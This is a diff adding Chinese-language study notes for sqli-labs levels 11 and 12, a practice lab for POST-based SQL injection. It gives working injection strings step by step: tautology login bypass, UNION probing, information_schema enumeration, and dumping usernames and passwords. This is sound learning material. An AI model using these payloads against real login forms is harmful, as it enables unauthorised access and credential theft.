@@ -1484,3 +1484,153 @@ http://localhost/sqli-labs/Less-2/
 
 ### Less-11
 
++ 第十一关页面发生变化，是账户登录页面。则注入点在输入框里。前十关用的是get请求参数都体现在url上，而从十一关开始是post请求，参数在表单里。可直接在输入框注入且参数不是一个还是两个。据前面的认识可猜测sql语句大概形式应该是`username=参数 and password=参数`，只是不知是字符型还是整数型
+
+
+
++ 当输入`1`时出现错误图片
+
+![Less-11_1](./img/Less-11_1.PNG)
+
+
+
++ 当输入`1'` 时出现报错
+
+![Less-11_2](./img/Less-11_2.PNG)
+
+根据报错信息可推断该sql语句`username='参数' and password='参数'`
+
+
+
++ 知道sql语句我们可构造一个恒成立的sql语句看能查询出什么，这里我们用`--+`注释就不行，需换`#`注释， 这个就和我们第一关是一样了。使用联合注入就可以获取数据库信息；首先注入万能语句
+
+~~~ shell
+1' or 1=1 #
+~~~
+
+![Less-11_3](./img/Less-11_3.PNG)
+
+
+
++ 和第一关一样，先注入以下语句判断回显位置
+
+~~~ shell
+1' union select 1,2 #
+~~~
+
+![Less-11_4](./img/Less-11_4.PNG)
+
+
+
++ 注入以下语句确定版本和数据库
+
+~~~ shell
+1' union select version(),database() #
+~~~
+
+![Less-11_5](./img/Less-11_5.PNG)
+
+
+
++ 注入如下语句爆破数据表
+
+~~~ shell
+1' union select 1,group_concat(table_name) from information_schema.tables where table_schema = 'security'#
+~~~
+
+![Less-11_6](./img/Less-11_6.PNG)
+
+
+
++ 注入语句爆破字段
+
+~~~ shell
+1' union select 1,group_concat(column_name) from information_schema.columns where table_name = 'users'#
+~~~
+
+![Less-11_7](./img/Less-11_7.PNG)
+
+
+
++ 最后爆破数据
+
+~~~ shell
+1' union select 1,group_concat(username,id,password) from users#
+~~~
+
+![Less-11_8](./img/Less-11_8.PNG)
+
+
+
+### Level-12
+
++ 首先打开第十二关，可以看到和第十一关的页面类似
+
+![Less-12_1](./img/Less-12_1.PNG)
+
+
+
++ 输入`1`和`1'`页面都没有反应
+
+![Less-12_2](./img/Less-12_2.PNG)
+
+
+
++ 输入<code>1"</code>页面出现报错，可知sql语句是双引号且有括号
+
+![Less-12_3](./img/Less-12_3.PNG)
+
+
+
++ 使用万能语句判断是否存在sql注入
+
+~~~ shell
+1") or 1=1
+~~~
+
+![Less-12_8](./img/Less-12_8.PNG)
+
+
+
++ 注入语句爆破版本号和数据库名
+
+~~~ shell
+1") union select version(),database() #
+~~~
+
+![Less-12_4](./img/Less-12_4.PNG)
+
+
+
++ 注入语句爆破数据表
+
+~~~ shell
+1") union select 1,group_concat(table_name) from information_schema.tables where table_schema = 'security' #
+~~~
+
+![Less-12_5](./img/Less-12_5.PNG)
+
+
+
++ 注入如下语句爆破字段
+
+~~~ shell
+1") union select 1,group_concat(column_name) from information_schema.columns where table_name = 'users' #
+~~~
+
+![Less-12_6](./img/Less-12_6.PNG)
+
+
+
++ 爆破用户和密码字段
+
+~~~ shell
+1") union select 1,group_concat(username,id,password) from users #
+~~~
+
+![Less-12_7](./img/Less-12_7.PNG)
+
+
+
+### Level-13
+
